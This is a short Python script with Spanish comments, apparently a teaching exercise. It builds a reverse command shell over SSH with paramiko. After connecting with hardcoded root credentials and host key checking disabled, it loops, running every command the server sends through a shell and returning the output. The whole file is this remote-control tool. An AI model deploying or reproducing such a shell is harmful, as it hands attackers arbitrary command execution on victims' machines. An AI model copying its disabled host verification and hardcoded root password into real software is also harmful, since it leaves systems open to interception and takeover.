import subprocess
import paramiko


def comando_ssh(ip, user, passwd, command):
    client = paramiko.SSHClient()

    # el cliente tambien puede usar archivos key
    # esto se hace asi: client.load_host_keys('/home/user/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))  # leer banner

        while True:
            # obtenemos el comando del servidor SSH
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command.decode(), shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
    client.close()
    return


comando_ssh('localhost', 'root', 'toor', 'ClientConnected')
